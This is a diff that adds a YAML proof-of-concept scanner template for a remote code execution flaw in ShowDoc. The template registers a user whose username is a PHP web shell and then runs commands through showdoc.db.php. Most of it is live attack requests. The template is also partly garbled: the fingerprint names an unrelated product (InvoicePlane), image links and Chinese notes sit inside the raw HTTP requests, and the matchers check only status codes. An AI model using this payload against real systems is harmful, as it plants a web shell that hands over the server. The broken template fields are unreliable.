@@ -1,0 +1,63 @@
+id: poc-nb3glohgaeiqck9q
+info:
+  name: ShowDoc registerByVerify存在代码注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nb3glohgaeiqck9q'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nb3glohgaeiqck9q
+    fofa: body="InvoicePlane"
+http:
+- raw:
+  - 'POST /server/index.php?s=/Api/Common/createCaptcha HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788788774500-4a156e74-a39c-4ef8-b9f1-16e151e114c8.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /server/index.php?s=/Api/Common/showCaptcha&captcha_id=301 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788788774717-5429a194-f0cb-4cf2-b058-745c0f360b1a.png)
+
+    注册恶意用户名'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /server/index.php?s=/Api/User/registerByVerify HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    username=%3C%3Fphp+echo%22%7CBGN1%7C%22%3Bsystem%28%24_GET%5B%27cmd%27%5D%29%3Becho%22%7CEND%7C%22%3B%3F%3E
+
+    &password=Showdoc%402026&confirm_password=Showdoc%402026&captcha_id=301&captcha=43u2
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788788775011-f17a07a3-5e61-4764-9893-8bd40529fd0a.png)
+
+    触发'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "GET /Sqlite/showdoc.db.php?cmd=whoami HTTP/1.1\nHost: {{Hostname}}\n响应为 SQLite 二进制垃圾数据，中间夹带：.\n|SHOWDOC_RCE_BGN|www-data|SHOWDOC_RCE_END|\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788788775348-db358433-275b-4ecc-b956-7212a8c90fd5.png)\nPS:使用官方默认 Sqlite/showdoc.db.php 的实例）在执行到触发步骤时会返回 HTTP 500 Internal Server Error，响应体为空,是因为数据库文件内部存在一张名为 \"<?php \" 的防护表：\nCREATE TABLE \"<?php \" (\n    `防止sqlite的数据库文件被直接下载` INTEGER\n)\n当 Web 服务器把 .db.php 交给 PHP 解析时，扫描器会把表名 \"<?php \" 识别为 PHP 起始标记，随后把后面的 SQLite 二进制数据当作 PHP 代码解析，必然触发语法错误 → HTTP 500。"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
